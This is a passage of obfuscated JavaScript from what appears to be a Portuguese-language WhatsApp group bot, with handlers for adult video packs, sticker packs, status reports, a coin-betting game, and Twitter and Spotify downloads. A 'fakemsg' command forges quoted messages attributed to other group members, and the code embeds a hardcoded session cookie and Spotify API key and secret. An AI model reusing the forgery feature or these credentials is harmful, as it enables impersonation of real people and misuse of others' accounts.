              if (!_0x2f3424) {
                return _0x50740b("É necessário que o comando seja ativado por um adm\nExemplo: " + _0x141936 + "modo+18");
              }
              numbr = Math.floor(Math.random() * 14) + 1;
              blaLN = ["https://github.com/Salientekill/Conteudos/raw/main/packs/EgrilVideo/%20" + numbr + ".mp4"];
              blarnd = blaLN[Math.floor(Math.random() * blaLN.length)];
              _0x3941ea(_0x346d97, blarnd, "🔥𝐏𝐀𝐂𝐊 𝐃𝐄 𝐕𝐈́𝐃𝐄𝐎𝐒 𝐃𝐄 𝐄𝐆𝐑𝐈𝐋𝐒🔥", '', [{
                'buttonId': '' + (_0x141936 + _0x267d4b),
                'buttonText': {
                  'displayText': "🔞 𝗣𝗥𝗢𝗫𝗜𝗠𝗢 🔞"
                },
                'type': 0x1
              }], _0x212ce6);
              break;
            case "packamadorv":
              if (!_0x2f3424) {
                return _0x50740b("É necessário que o comando seja ativado por um adm\nExemplo: " + _0x141936 + "modo+18");
              }
              numbr = Math.floor(Math.random() * 14) + 1;
              blaLN = ["https://github.com/Salientekill/Conteudos/raw/main/packs/AmadorVideo/" + numbr + ".mp4"];
              blarnd = blaLN[Math.floor(Math.random() * blaLN.length)];
              _0x3941ea(_0x346d97, blarnd, "🔥𝐏𝐀𝐂𝐊 𝐃𝐄 𝐕𝐈́𝐃𝐄𝐎𝐒 𝐀𝐌𝐀𝐃𝐎𝐑🔥", '', [{
                'buttonId': '' + (_0x141936 + _0x267d4b),
                'buttonText': {
                  'displayText': "🔞 𝗣𝗥𝗢𝗫𝗜𝗠𝗢 🔞"
                },
                'type': 0x1
              }], _0x212ce6);
              break;
            case "packfig":
              if (!_0x11e99e) {
                return _0x50740b("falta o nome do pack");
              }
              try {
                lotus = await fetchJson("https://raw.githubusercontent.com/Salientekill/figurinhas/main/jsons/" + _0x11e99e + ".json");
                _0x50740b("Enviando O Pack No Seu Privado");
                for (let _0x3e8ca0 of lotus[0].link) {
                  await delay(1000);
                  _0x125a55(_0x246d48, _0x3e8ca0, enviar.success);
                }
              } catch {
                _0x50740b("ERRO");
              }
              break;
            case "packfig18":
              if (!_0x2f3424) {
                return _0x50740b("É necessário que o comando seja ativado por um adm\nExemplo: " + _0x141936 + "modo+18 1");
              }
              if (!_0x11e99e) {
                return _0x50740b("falta o nome do pack");
              }
              try {
                lotus = await fetchJson("https://raw.githubusercontent.com/Salientekill/figurinhas/main/jsons/%2B18/" + _0x11e99e + ".json");
                _0x50740b("Enviando O Pack No Seu Privado");
                for (let _0x56ed46 of lotus[0].link) {
                  await delay(1000);
                  _0x125a55(_0x246d48, _0x56ed46, enviar.success);
                }
              } catch {
                _0x50740b("ERRO");
              }
              break;
            case "packsfigs":
              {
                const _0xab4314 = {
                  '1': _0x141936 + "packfig amanda",
                  '2': _0x141936 + "packfig anya",
                  '3': _0x141936 + "packfig animadas1",
                  '4': _0x141936 + "packfig animadas2",
                  '5': _0x141936 + "packfig asta",
                  '6': _0x141936 + "packfig asuna",
                  '7': _0x141936 + "packfig ayaka",
                  '8': _0x141936 + "packfig bakugou",
                  '9': _0x141936 + "packfig ben",
                  '10': _0x141936 + "packfig boruto",
                  '11': _0x141936 + "packfig brad",
                  '12': _0x141936 + "packfig douma",
                  '13': _0x141936 + "packfig esdeath1",
                  '14': _0x141936 + "packfig esdeath2",
                  '15': _0x141936 + "packfig floopa",
                  '16': _0x141936 + "packfig fran",
                  '17': _0x141936 + "packfig freddy",
                  '18': _0x141936 + "packfig gamo-chan",
                  '19': _0x141936 + "packfig goku",
                  '20': _0x141936 + "packfig gunther",
                  '21': _0x141936 + "packfig gwen",
                  '22': _0x141936 + "packfig gyomei",
                  '23': _0x141936 + "packfig hades",
                  '24': _0x141936 + "packfig hex",
                  '25': _0x141936 + "packfig hinata",
                  '26': _0x141936 + "packfig hinata2",
                  '27': _0x141936 + "packfig jaison",
                  '28': _0x141936 + "packfig japinha1",
                  '29': _0x141936 + "packfig japinha2",
                  '30': _0x141936 + "packfig japinha3",
                  '31': _0x141936 + "packfig jjk",
                  '32': _0x141936 + "packfig kick",
                  '33': _0x141936 + "packfig kitagawa",
                  '34': _0x141936 + "packfig levi",
                  '35': _0x141936 + "packfig lotus1",
                  '36': _0x141936 + "packfig lotus2",
                  '37': _0x141936 + "packfig lum",
                  '38': _0x141936 + "packfig madara",
                  '39': _0x141936 + "packfig mclovin",
                  '90': _0x141936 + "packfig18 0",
                  '91': _0x141936 + "packfig18 1",
                  '92': _0x141936 + "packfig18 2",
                  '93': _0x141936 + "packfig18 3",
                  '94': _0x141936 + "packfig18 4",
                  '95': _0x141936 + "packfig18 5",
                  '96': _0x141936 + "packfig18 6",
                  '97': _0x141936 + "packfig18 7",
                  '98': _0x141936 + "packfig18 8",
                  '99': _0x141936 + "packfig18 9",
                  '50': _0x141936 + "packfig meliodas",
                  '51': _0x141936 + "packfig memes1",
                  '52': _0x141936 + "packfig memes2",
                  '53': _0x141936 + "packfig memes3",
                  '54': _0x141936 + "packfig memes4",
                  '55': _0x141936 + "packfig memes5",
                  '56': _0x141936 + "packfig mereoleona",
                  '57': _0x141936 + "packfig midoriya",
                  '58': _0x141936 + "packfig mitsuri",
                  '59': _0x141936 + "packfig mmotty",
                  '60': _0x141936 + "packfig nagatoro",
                  '61': _0x141936 + "packfig nagi",
                  '62': _0x141936 + "packfig nanatsu1",
                  '63': _0x141936 + "packfig nanatsu2",
                  '64': _0x141936 + "packfig naruto",
                  '65': _0x141936 + "packfig naruto2",
                  '66': _0x141936 + "packfig naruto3",
                  '67': _0x141936 + "packfig nezuko",
                  '68': _0x141936 + "packfig nezuko2",
                  '69': _0x141936 + "packfig noelle",
                  '70': _0x141936 + "packfig obanai",
                  '71': _0x141936 + "packfig obito",
                  '72': _0x141936 + "packfig onepiece",
                  '73': _0x141936 + "packfig otaru",
                  '74': _0x141936 + "packfig ran",
                  '75': _0x141936 + "packfig rei",
                  '76': _0x141936 + "packfig rengoku",
                  '77': _0x141936 + "packfig rhya",
                  '78': _0x141936 + "packfig romanticas1",
                  '79': _0x141936 + "packfig romanticas2",
                  '80': _0x141936 + "packfig romanticas3",
                  '81': _0x141936 + "packfig saitama",
                  '82': _0x141936 + "packfig sakura",
                  '83': _0x141936 + "packfig sanemi",
                  '84': _0x141936 + "packfig seiya",
                  '85': _0x141936 + "packfig senpai",
                  '87': _0x141936 + "packfig shinobu",
                  '88': _0x141936 + "packfig shinobu2",
                  '89': _0x141936 + "packfig springtrap",
                  '42': _0x141936 + "packfig tanjiro",
                  '43': _0x141936 + "packfig tokito",
                  '44': _0x141936 + "packfig tomioka",
                  '45': _0x141936 + "packfig tomioka2",
                  '46': _0x141936 + "packfig triste1",
                  '47': _0x141936 + "packfig triste2",
                  '48': _0x141936 + "packfig uzui",
                  '49': _0x141936 + "packfig yoshi",
                  '41': _0x141936 + "packfig zenitsu",
                  '40': _0x141936 + "packfig zora"
                };
                _0x56d611[_0x346d97] = {
                  'sender': _0x246d48,
                  'time': Date.now() + 30000,
                  'comandos': _0xab4314
                };
                fs.writeFileSync("./DADOS/json/optionscmd.json", JSON.stringify(_0x56d611, null, 2));
                let _0x578e20 = "🇵 🇦 🇨 🇰 🇸  🇩 🇪  🇫 🇮 🇬 🇸\n\n" + lermais + "1. ❄️ AMANDA ❄️\n" + "2. ❄️ ANYA ❄️\n" + "3. ❄️ ANIMADAS1 ❄️\n" + "4. ❄️ ANIMADAS2 ❄️\n" + "5. ❄️ ASTA ❄️\n" + "6. ❄️ ASUNA ❄️\n" + "7. ❄️ AYAKA ❄️\n" + "8. ❄️ BAKUGOU ❄️\n" + "9. ❄️ BEN ❄️\n" + "10. ❄️ BORUTO ❄️\n" + "11. ❄️ BRAD ❄️\n" + "12. ❄️ DOUMA ❄️\n" + "13. ❄️ ESDAETH1 ❄️\n" + "14. ❄️ ESDAETH2 ❄️\n" + "15. ❄️ FLOOPA ❄️\n" + "16. ❄️ FRAN ❄️\n" + "17. ❄️ FREDDY ❄️\n" + "18. ❄️ GAMO-CHAN ❄️\n" + "19. ❄️ GOKU ❄️\n" + "20. ❄️ GUNTHER ❄️\n" + "21. ❄️ GWEN ❄️\n" + "22. ❄️ GYOMEI ❄️\n" + "23. ❄️ HADES ❄️\n" + "24. ❄️ HEX ❄️\n" + "25. ❄️ HINATA ❄️\n" + "26. ❄️ HINATA2 ❄️\n" + "27. ❄️ JAISON ❄️\n" + "28. ❄️ JAPINHA1 ❄️\n" + "29. ❄️ JAPINHA2 ❄️\n" + "30. ❄️ JAPINHA3 ❄️\n" + "31. ❄️ JJK ❄️\n" + "32. ❄️ KICK ❄️\n" + "33. ❄️ KITAGAWA ❄️\n" + "34. ❄️ LEVI ❄️\n" + "35. ❄️ LOTUS1 ❄️\n" + "36. ❄️ LOTUS2 ❄️\n" + "37. ❄️ LUM ❄️\n" + "38. ❄️ MADARA ❄️\n" + "39. ❄️ MCLOVIN ❄️\n" + "40. ❄️ ZORA ❄️\n" + "41. ❄️ ZENITSU ❄️\n" + "42. ❄️ TANJIRO ❄️\n" + "43. ❄️ TOKITO ❄️\n" + "44. ❄️ TOMIOKA ❄️\n" + "45. ❄️ TOMIOKA2 ❄️\n" + "46. ❄️ TRISTE1 ❄️\n" + "47. ❄️ TRISTE2 ❄️\n" + "48. ❄️ UZUI ❄️\n" + "49. ❄️ YOSHI ❄️\n" + "50. ❄️ MELIODAS ❄️\n" + "51. ❄️ MEMES1 ❄️\n" + "52. ❄️ MEMES2 ❄️\n" + "53. ❄️ MEMES3 ❄️\n" + "54. ❄️ MEMES4 ❄️\n" + "55. ❄️ MEMES5 ❄️\n" + "56. ❄️ MEREOLEONA ❄️\n" + "57. ❄️ MIDORIYA ❄️\n" + "58. ❄️ MITSURI ❄️\n" + "59. ❄️ MMOTTY ❄️\n" + "60. ❄️ NAGATORO ❄️\n" + "61. ❄️ NAGI ❄️\n" + "62. ❄️ NANATSU1 ❄️\n" + "63. ❄️ NANATSU2 ❄️\n" + "64. ❄️ NARUTO ❄️\n" + "65. ❄️ NARUTO2 ❄️\n" + "66. ❄️ NARUTO3 ❄️\n" + "67. ❄️ NEZUKO ❄️\n" + "68. ❄️ NEZUKO2 ❄️\n" + "69. ❄️ NOELLE ❄️\n" + "70. ❄️ OBANAI ❄️\n" + "71. ❄️ OBITO ❄️\n" + "72. ❄️ ONEPIECE ❄️\n" + "73. ❄️ OTARU ❄️\n" + "74. ❄️ RAN ❄️\n" + "75. ❄️ REI ❄️\n" + "76. ❄️ RENGOKU ❄️\n" + "77. ❄️ RHYA ❄️\n" + "78. ❄️ ROMANTICAS1 ❄️\n" + "79. ❄️ ROMANTICAS2 ❄️\n" + "80. ❄️ ROMANTICAS3 ❄️\n" + "81. ❄️ SAITAMA ❄️\n" + "82. ❄️ SAKURA ❄️\n" + "83. ❄️ SANEMI ❄️\n" + "84. ❄️ SEIYA ❄️\n" + "85. ❄️ SENPAI ❄️\n" + "86. ❄️ SHIGARAKI ❄️\n" + "87. ❄️ SHINOBU ❄️\n" + "88. ❄️ SHINOBU2 ❄️\n" + "89. ❄️ SPRINGTRAP ❄️\n" + "90. 🔞 PACK+18 0 🔞\n" + "91. 🔞 PACK+18 1 🔞\n" + "92. 🔞 PACK+18 2 🔞\n" + "93. 🔞 PACK+18 3 🔞\n" + "94. 🔞 PACK+18 4 🔞\n" + "95. 🔞 PACK+18 5 🔞\n" + "96. 🔞 PACK+18 6 🔞\n" + "97. 🔞 PACK+18 7 🔞\n" + "98. 🔞 PACK+18 8 🔞\n" + "99. 🔞 PACK+18 9 🔞";
                const _0x4cbb61 = {
                  text: _0x578e20
                };
                const _0x1065ca = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, _0x4cbb61, _0x1065ca);
              }
              break;
            case "ping8":
              {
                let _0x127e98 = require('os');
                usedMemory = process.memoryUsage().heapUsed / 1024 / 1024;
                memoryUnit = usedMemory > 1024 ? 'GB' : 'MB';
                usedMemoryFormatted = memoryUnit === 'GB' ? usedMemory / 1024 : usedMemory;
                pluralizedMemoryUnit = usedMemoryFormatted !== 1 ? 's' : '';
                let _0xc4b98a = await _0x5196be.groupFetchAllParticipating();
                let _0x2cca7e = Object.entries(_0xc4b98a).slice(0).map(_0x692a54 => _0x692a54[1]);
                let _0x3dbd55 = _0x2cca7e.filter(_0x2a5477 => !_0x2a5477.isCommunity && !_0x2a5477.isCommunityAnnounce && !_0x2a5477.isReadOnly);
                let _0x7e1746 = _0x2cca7e.filter(_0x5d00da => _0x5d00da.isCommunity || _0x5d00da.isCommunityAnnounce || _0x5d00da.isReadOnly).length;
                let _0x2162c9 = process.uptime();
                let _0x5191d2 = Date.now() / 1000 - _0xd2050d.messageTimestamp;
                let _0x1fb81c = _0x5191d2 < 1 ? Math.round(_0x5191d2 * 1000) + " Ms" : Math.round(_0x5191d2) + " S";
                let _0x45ce3a = "\n╭╍❆╍━━⊰❆̸" + _0x2cd689 + "❆̸⊱━━╍❆╍╮\n╏                  *𝑷𝑰𝑵𝑮*\n╏❆ *Velocidade:* " + _0x1fb81c + "\n╏❆ *Online A:* " + kyun(_0x2162c9) + " \n╏❆ *Funcionando em:* " + _0x3dbd55.length + " Grupos\n╏❆ *Sistema:*  " + _0x127e98.type() + "\n╏❆ *Versão:* " + _0x127e98.release() + " \n╏❆ *RAM Total:* " + (_0x127e98.totalmem() / Math.pow(1024, 3)).toFixed(2) + " GB\n╏❆ *RAM Disponível:* " + (_0x127e98.freemem() / Math.pow(1024, 3)).toFixed(2) + " GB\n╏❆ *RAM Usada:* " + usedMemoryFormatted.toFixed(usedMemoryFormatted % 1 !== 0 ? 2 : 0) + " " + memoryUnit + pluralizedMemoryUnit + "\n╏❆ *Uso de RAM:* " + ((_0x127e98.totalmem() - _0x127e98.freemem()) / _0x127e98.totalmem() * 100).toFixed(2) + "%\n╏❆ *Uso de CPU:* " + _0x127e98.loadavg()[0].toFixed(2) + "%\n╏❆ *Comunidades/Anúncios/Somente Leitura:* " + _0x7e1746 + "\n╰╍❆╍━━⊰❆̸" + _0x2cd689 + "❆̸⊱━━╍❆╍╯";
                const _0xa31df = {
                  text: _0x45ce3a
                };
                const _0x596fe4 = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, _0xa31df, _0x596fe4);
              }
              break;
            case "apostargold":
            case "apostagold":
              {
                if (!_0x89cd51) {
                  return _0x50740b("Este comando só deve ser utilizado em Grupos.");
                }
                if (!_0x33d21e) {
                  return _0x50740b("Este comando só pode ser utilizado quando o sistema " + _0x141936 + "sistemgold 1 está ativado.");
                }
                if (!_0x2c9f11(_0x11e99e.trim())) {
                  return _0x50740b("Exemplo: " + (_0x141936 + _0x267d4b) + " 100");
                }
                if (_0x3de59a.RS_C(_0x246d48, "ChanceAp") >= 5) {
                  return _0x50740b("Você não tem mais chances de apostar, volte amanhã...");
                }
                var _0x830e89 = Math.floor(_0x11e99e.trim());
                if (_0x3de59a.RS(_0x246d48, "Golds") < _0x830e89) {
                  return _0x50740b("Você não tem essa quantidade de Golds para apostar, veja se contém chances de você minerar ou outras ações em menugold, e boas aventuras.");
                }
                var _0x21f1b5 = Math.floor(Math.random() * 4);
                var _0x250fbc = ["Infelizmente, você perdeu " + _0x830e89 + " Golds nessa aposta. Melhor sorte na próxima vez!", "Parece que a sorte não estava do seu lado hoje. Você perdeu " + _0x830e89 + " Golds na aposta.", "Sinto muito, mas você perdeu " + _0x830e89 + " Golds nessa rodada. Não desanime, a próxima pode ser sua!", "Ah, que pena! Você perdeu " + _0x830e89 + " Golds nessa aposta. Lembre-se, cada derrota é uma oportunidade para aprender algo novo", "A aposta não saiu como esperado e você perdeu " + _0x830e89 + " Golds. Mas não se preocupe, amanhã é um novo dia!"];
                var _0x16ea1d = ["Parabéns! Você ganhou " + _0x830e89 * 2 + " Golds nessa aposta. Continue assim!", "Incrível! Você acertou e ganhou " + _0x830e89 * 2 + " Golds. Que sorte!", "Você fez a jogada certa e ganhou " + _0x830e89 * 2 + " Golds. Isso é fantástico!", "Que vitória! Você ganhou " + _0x830e89 * 2 + " Golds nessa aposta. Que o seu sucesso continue!", "Excelente! Você ganhou " + _0x830e89 * 2 + " Golds. Sua estratégia realmente funcionou!"];
                if (_0x21f1b5 === 0) {
                  _0x50740b(_0x250fbc[Math.floor(Math.random() * _0x250fbc.length)]);
                  _0x3de59a.RM(_0x246d48, _0x830e89);
                } else {
                  if (_0x21f1b5 === 1) {
                    _0x50740b(_0x16ea1d[Math.floor(Math.random() * _0x16ea1d.length)]);
                    _0x3de59a.ADD(_0x246d48, _0x830e89 * 2);
                  } else {
                    if (_0x21f1b5 === 2) {
                      _0x50740b("Você teve 50% de sorte e 50% de azar, perdeu metade do que apostou ( " + _0x830e89 / 2 + " ), Boa sorte na próxima.");
                      _0x3de59a.RM(_0x246d48, _0x830e89 / 2);
                    } else {
                      _0x50740b("Você nem perdeu nem ganhou, ao menos continuou com o que apostou, Boa sorte na próxima.");
                    }
                  }
                }
                _0x3de59a.ADD_C_M(_0x246d48, "ChanceAp", 1);
              }
              break;
            case "rankcmd":
              let _0x3da07b = "RANKING DE COMANDOS MAIS USADOS\n\n";
              let _0x2ad81b = {};
              _0x14ab06.forEach(_0xa26988 => {
                for (let _0x250413 in _0xa26988.comandos) {
                  if (_0x250413 !== "comandos-usados" && _0x250413 !== "status-bot" && _0x250413 !== "rankcmd") {
                    if (!_0x2ad81b[_0x250413]) {
                      _0x2ad81b[_0x250413] = _0xa26988.comandos[_0x250413];
                    } else {
                      _0x2ad81b[_0x250413] += _0xa26988.comandos[_0x250413];
                    }
                  }
                }
              });
              let _0x40cab9 = Object.entries(_0x2ad81b).sort(([, _0x480f0b], [, _0x558876]) => _0x558876 - _0x480f0b).slice(0, 5);
              _0x40cab9.forEach(([_0x5c77e4, _0x11d77c]) => {
                _0x3da07b += _0x5c77e4 + " - Total: " + _0x11d77c + "\n";
              });
              _0x50740b(_0x3da07b);
              break;
            case "comandos-usados":
              let _0x10cd24 = "COMANDOS MAIS USADOS\n\n";
              for (let _0x479af8 = 0; _0x479af8 < _0x14ab06.length; _0x479af8++) {
                grupo = _0x14ab06[_0x479af8];
                _0x10cd24 += "Nome do Grupo: " + grupo.nome + "\nID: " + grupo.grupo + "\nComandos:\n";
                totalComandosGrupo = 0;
                comandosOrdenados = Object.entries(grupo.comandos).filter(([_0x414096, _0x387c22]) => _0x414096 !== "comandos-usados" && _0x414096 !== "status-bot").sort(([, _0x3c3e11], [, _0x4afcc2]) => _0x4afcc2 - _0x3c3e11).slice(0, 5);
                comandosOrdenados.forEach(([_0x270db7, _0x1a73c4]) => {
                  _0x10cd24 += _0x270db7 + " - Total: " + _0x1a73c4 + "\n";
                  totalComandosGrupo += _0x1a73c4;
                });
                _0x10cd24 += "\nTotal de comandos usados: " + totalComandosGrupo + "\n\n";
              }
              _0x50740b(_0x10cd24);
              break;
            case "status-bot":
              uptime = process.uptime();
              ping = speed();
              totalComandos = 0;
              totalMensagens = 0;
              comandosPorGrupo = {};
              for (let _0x23cd51 = 0; _0x23cd51 < _0x14ab06.length; _0x23cd51++) {
                let _0x53a9e8 = _0x14ab06[_0x23cd51];
                if (_0x53a9e8.comandos) {
                  for (let _0xa09306 in _0x53a9e8.comandos) {
                    if (_0xa09306 !== "status-bot" && _0xa09306 !== "comandos-usados" && _0xa09306 !== "rankcmd") {
                      totalComandos += _0x53a9e8.comandos[_0xa09306];
                      comandosPorGrupo[_0xa09306] = (comandosPorGrupo[_0xa09306] || 0) + _0x53a9e8.comandos[_0xa09306];
                    }
                  }
                  totalMensagens += _0x53a9e8.mensagens;
                }
              }
              elapsedTime = Date.now() / 1000 - _0xd2050d.messageTimestamp;
              responseTime = elapsedTime < 1 ? Math.round(elapsedTime * 1000) + " Ms" : Math.round(elapsedTime) + " S";
              usedMemory = process.memoryUsage().heapUsed / 1024 / 1024;
              memoryUnit = usedMemory > 1024 ? 'GB' : 'MB';
              usedMemoryFormatted = memoryUnit === 'GB' ? usedMemory / 1024 : usedMemory;
              pluralizedMemoryUnit = usedMemoryFormatted !== 1 ? 's' : '';
              comandoMaisUsado = Object.entries(comandosPorGrupo).reduce((_0x1ecaad, _0x34a053) => _0x1ecaad[1] > _0x34a053[1] ? _0x1ecaad : _0x34a053, ["N/A", 0])[0];
              totalComandoMaisUsado = comandosPorGrupo[comandoMaisUsado] || 0;
              statusMessage = "\n🤖 *Ping* \n*Velocidade:* " + responseTime + "\n*Ram Usada Pelo BOT:* " + usedMemoryFormatted.toFixed(usedMemoryFormatted % 1 !== 0 ? 2 : 0) + " " + memoryUnit + pluralizedMemoryUnit + "\n*Bot Reiniciou a:* " + kyun(uptime) + " Atrás.\n\nInformações:\n\n" + totalMensagens + " Mensagens recebidas\n\n" + totalComandos + " Comandos recebidos em " + _0x14ab06.length + " grupos.\n\nComando mais usado: " + comandoMaisUsado + "\nTotal: " + totalComandoMaisUsado;
              _0x50740b(statusMessage);
              break;
            case "twitter2":
              try {
                if (!_0x11e99e.includes("twitter")) {
                  return _0x50740b("Exemplo: " + (_0x141936 + _0x267d4b) + " o link do Twitter");
                }
                _0x50740b(enviar.espere);
                url_T = "https://twitsave.com/info?url=" + _0x11e99e;
                _0x533342 = [];
                require("axios").get(url_T, {
                  'headers': {
                    'accept': "*/*",
                    'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.53",
                    'Accept-Language': "en-US,en;q=0.9,it;q=0.8,es;q=0.7",
                    'referer': "https://www.google.com/",
                    'cookie': "DSID=AAO-7r4OSkS76zbHUkiOpnI0kk-X19BLDFF53G8gbnd21VZV2iehu-w_2v14cxvRvrkd_NjIdBWX7wUiQ66f-D8kOkTKD1BhLVlqrFAaqDP3LodRK2I0NfrObmhV9HsedGE7-mQeJpwJifSxdchqf524IMh9piBflGqP0Lg0_xjGmLKEQ0F4Na6THgC06VhtUG5infEdqMQ9otlJENe3PmOQTC_UeTH5DnENYwWC8KXs-M4fWmDADmG414V0_X0TfjrYu01nDH2Dcf3TIOFbRDb993g8nOCswLMi92LwjoqhYnFdf1jzgK0"
                  }
                }).then(async _0x423d91 => {
                  var _0xcf1154 = cheerio.load(_0x423d91.data);
                  _0xcf1154('a').each(function (_0x4890b6, _0x62d433) {
                    var _0x1493ab = _0xcf1154(_0x62d433).attr("href");
                    if (_0x1493ab.length > 150) {
                      _0x533342.push({
                        'url': _0x1493ab
                      });
                    }
                  });
                  const _0x42a304 = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, {
                    'video': await getBuffer(_0x533342[0].url),
                    'mimetype': "video/mp4"
                  }, _0x42a304);
                })["catch"](_0x44980f => {
                  return _0x50740b("Erro..");
                });
              } catch (_0x5b6d7e) {
                return _0x50740b("Erro..");
              }
              break;
            case "criar-rank":
              {
                if (!_0x89cd51) {
                  return _0x50740b(mess.msg.grupo);
                }
                if (!_0x3f2f63) {
                  return _0x50740b(mess.msg.admin);
                }
                if (!_0x11e99e) {
                  return _0x50740b(fala.notfala(_0x141936, _0x267d4b) + " cu|5");
                }
                if (!_0x11e99e.includes('|')) {
                  return _0x50740b(fala.notfala(_0x141936, _0x267d4b) + " cu|5");
                }
                let [_0x226de7, _0x4f0de4] = _0x23d865.join(" ").split('|');
                rank = "Rank " + _0x226de7 + "\n\n";
                for (_0x3194f3 = 0; _0x3194f3 < parseInt(_0x4f0de4); _0x3194f3++) {
                  mrb = Math.floor(Math.random() * _0x3071b5.participants.length + 0);
                  rank += _0x3194f3 + 1 + "° → @" + groupMembers[mrb].id.split('@')[0] + "\n";
                }
                _0x5dcc57(rank);
              }
              break;
            case "fakemsg":
              if (!_0x89cd51) {
                return enviar(resposta.grupo);
              }
              if (!_0x3f2f63) {
                return enviar(resposta.adm);
              }
              if (!_0x42a9f2) {
                return enviar(resposta.botadm);
              }
              if (!_0x11e99e || !_0x11e99e.includes('|') || _0x11e99e.split('|').length < 3) {
                return enviar("Para usar o comando, envie " + (prefixo + _0xdef020) + " seguido de '@' e mencione a pessoa que deseja forjar a mensagem, depois use '|' para separar a mensagem forjada da resposta.");
              }
              let [_0x4947a9, _0x584c05, _0x47de70] = _0x11e99e.split('|').map(_0x53090f => _0x53090f.trim());
              if (!_0x4947a9) {
                return enviar("Você precisa mencionar a pessoa que deseja forjar a mensagem.");
              }
              if (!_0x584c05 || !_0x47de70) {
                return enviar("Por favor, insira a mensagem forjada e a resposta separadas por \"|\"");
              }
              let _0x30a65b = _0x4947a9.split('@')[1] + "@s.whatsapp.net";
              const _0x7150a8 = {
                text: _0x47de70
              };
              const _0x1500ae = {
                fromMe: false,
                participant: _0x30a65b
              };
              const _0x13a73d = {
                text: _0x584c05
              };
              const _0x3bdb07 = {
                extendedTextMessage: _0x13a73d
              };
              const _0x6d6c84 = {
                key: _0x1500ae,
                message: _0x3bdb07
              };
              const _0x5ec08f = {
                quoted: _0x6d6c84
              };
              _0x5196be.sendMessage(_0x346d97, _0x7150a8, _0x5ec08f);
              break;
            case "testesr":
              {
                let _0x4df019 = moment().tz("America/Sao_Paulo").format("HH:mm:ss");
                let _0x3568fa = '';
                if (_0x4df019 >= "04:00:00" && _0x4df019 < "12:00:00") {
                  _0x3568fa = "Um Bom Dia 🌄";
                } else {
                  if (_0x4df019 >= "12:00:00" && _0x4df019 < "18:00:00") {
                    _0x3568fa = "Uma Boa Tarde 🌅";
                  } else {
                    if (_0x4df019 >= "18:00:00" && _0x4df019 < "24:00:00") {
                      _0x3568fa = "Uma Boa Noite 🌃";
                    } else if (_0x4df019 >= "00:00:00" && _0x4df019 < "04:00:00") {
                      _0x3568fa = "Uma Boa Madrugada 🌌";
                    }
                  }
                }
                let _0x34506c = await _0x5196be.profilePictureUrl(_0x346d97, "image");
                const _0x387d8a = {
                  showAdAttribution: true,
                  title: "Eu Sou a " + NomeDoBot + " Tenha " + _0x3568fa,
                  body: "Bot criado por " + NickDono,
                  thumbnailUrl: _0x34506c,
                  sourceUrl: "https://chat.whatsapp.com/GTXYQ9ipObnKfHU1jMPLII",
                  mediaType: 0x1,
                  renderLargerThumbnail: true
                };
                const _0x52d31a = {
                  externalAdReply: _0x387d8a
                };
                const _0x4bde0e = {
                  text: "teste",
                  contextInfo: _0x52d31a
                };
                const _0x3801bf = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, _0x4bde0e, _0x3801bf);
              }
              break;
            case "spotify":
              try {
                let _0x298e5a = _0x11e99e.trim();
                if (!_0x298e5a) {
                  return _0x50740b("Por favor, forneça o link ou o nome da música do Spotify que deseja baixar.\n\nExemplo:\n" + (_0x141936 + _0x267d4b) + " https://open.spotify.com/track/5MxNLUsfh7uzROypsoO5qe\nou\n" + (_0x141936 + _0x267d4b) + " Teto M4");
                }
                let _0x39de7b;
                if (_0x298e5a.startsWith("http")) {
                  _0x39de7b = await _0x48f566(_0x298e5a);
                } else {
                  let _0x5d3653 = require("spotify-finder");
                  const _0x4656f0 = {
                    key: "271f6e790fb943cdb34679a4adcc34cc",
                    secret: "c009525564304209b7d8b705c28fd294"
                  };
                  const _0x111663 = {
                    consumer: _0x4656f0
                  };
                  let _0x7c0b97 = new _0x5d3653(_0x111663);
                  const _0x2e9534 = {
                    q: _0x298e5a,
                    type: "track",
                    limit: 0x1
                  };
                  let _0x5e03bd = await _0x7c0b97.search(_0x2e9534);
                  if (_0x5e03bd && _0x5e03bd.tracks && _0x5e03bd.tracks.items.length > 0) {
                    let _0x4470a8 = _0x5e03bd.tracks.items[0];
                    _0x39de7b = {
                      'name': _0x4470a8.name,
                      'artists': _0x4470a8.artists.map(_0xd771ce => _0xd771ce.name),
                      'album': _0x4470a8.album.name,
                      'release_date': _0x4470a8.album.release_date,
                      'popularity': _0x4470a8.popularity,
                      'url': _0x4470a8.external_urls.spotify,
                      'thumbnail': _0x4470a8.album.images.length > 0 ? _0x4470a8.album.images[0].url : null
                    };
                  }
                }
                if (_0x39de7b) {
                  let {
                    name: _0x87605c,
                    artists: _0x3c58d7,
                    album: _0x37e85d,
                    release_date: _0x26931c,
                    popularity: _0x2c67f9,
                    url: _0xe17b1a,
                    thumbnail: _0x2d662d
                  } = _0x39de7b;
                  let _0x3caa96 = "┌─⊷ *PLAY SPOTIFY* 🎙️\n▢ *Título:* " + _0x87605c + "\n▢ *Artista(s):* " + _0x3c58d7.join(", ") + "\n▢ *Álbum:* " + _0x37e85d + "\n▢ *Data de Lançamento:* " + _0x26931c + "\n▢ *Popularidade:* " + _0x2c67f9 + "%\n▢ *Link da Música:* [Ouça aqui]\n(" + _0xe17b1a + ")\n└────────────────┈ ⳹ ";
                  const _0x47ffd4 = {
                    url: _0x2d662d
                  };
                  const _0x120d86 = {
                    image: _0x47ffd4,
                    caption: _0x3caa96
                  };
                  const _0x1c1ed5 = {
                    quoted: _0xd2050d
                  };
                  await _0x5196be.sendMessage(_0x346d97, _0x120d86, _0x1c1ed5);
                  let _0x5cdfbb = await _0x39d764(_0xe17b1a);
                  if (_0x5cdfbb) {
                    fs.writeFileSync("spotify_audio.mp3", _0x5cdfbb);
                    const _0x2e28f0 = {
                      quoted: _0xd2050d
                    };
                    await _0x5196be.sendMessage(_0x346d97, {
                      'audio': fs.readFileSync("spotify_audio.mp3"),
                      'mimetype': "audio/mpeg",
                      'filename': "spotify_audio.mp3"
                    }, _0x2e28f0);
                    fs.unlinkSync("spotify_audio.mp3");
                  } else {
                    _0x50740b("Não foi possível baixar o áudio do Spotify.");
                  }
                } else {
                  _0x50740b("Não foi possível encontrar informações da música no Spotify.");
                }
              } catch (_0x369a0f) {
